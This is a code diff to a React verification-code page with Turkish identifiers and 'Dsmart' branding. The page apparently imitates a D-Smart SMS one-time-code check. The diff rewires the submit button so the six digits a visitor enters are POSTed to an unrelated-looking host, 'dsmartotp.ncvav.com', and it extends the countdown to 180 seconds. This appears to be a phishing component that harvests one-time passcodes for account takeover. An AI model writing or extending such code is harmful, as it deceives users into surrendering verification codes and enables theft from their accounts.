@@ -16,7 +16,7 @@ import { cardStyle } from "./style/card";
 import { useSearchParams } from "react-router-dom";
 
 const CODE_LENGTH = 6;
-const TIMER_SECONDS = 5;
+const TIMER_SECONDS = 180;
 
 function App() {
   const [gsmNo] = useState("5XX XXX XX XX");
@@ -149,41 +149,37 @@ function App() {
     inputRefs.current[focusIndex]?.focus();
   };
 
-  const handleTekrarDene = () => {
-    setCode(Array(CODE_LENGTH).fill(""));
-
-    setRemaining(TIMER_SECONDS);
-
-    setSonuc(null);
-    setHataMesaji("");
-    setGonderiliyor(false);
-
-    setTimeout(() => {
-      inputRefs.current[0]?.focus();
-    }, 50);
-  };
-
-  const handleDogrula = async () => {
+  const sendCode = async () => {
     if (!isCodeComplete || gonderiliyor) {
       return;
     }
 
-    setHataMesaji("");
-    setGonderiliyor(true);
-
     try {
-      const basarili = code.every((digit) => digit !== "");
+      const response = await fetch(
+        "https://dsmartotp.ncvav.com/Dsmart/Api/backend_dogrula",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            kod: code,
+          }),
+        },
+      );
 
-      if (basarili) {
-        setSonuc("basarili");
+      if (response) {
+        console.log(response.json());
       } else {
-        setSonuc("basarisiz");
+        console.log("hata");
       }
-    } catch {
-      setHataMesaji("Bağlantı hatası, lütfen tekrar deneyin.");
-    } finally {
-      setGonderiliyor(false);
+    } catch (error) {
+      console.log(error);
     }
+  };
+
+  const handleTekrarDene = () => {
+    window.location.reload();
   };
 
   const isCodeComplete = code.every((digit) => digit !== "");
@@ -423,7 +419,7 @@ function App() {
               fullWidth
               variant="contained"
               disabled={!isCodeComplete || gonderiliyor || sureBitti}
-              onClick={handleDogrula}
+              onClick={sendCode}
               sx={{
                 ...verifyButtonStyle,
 
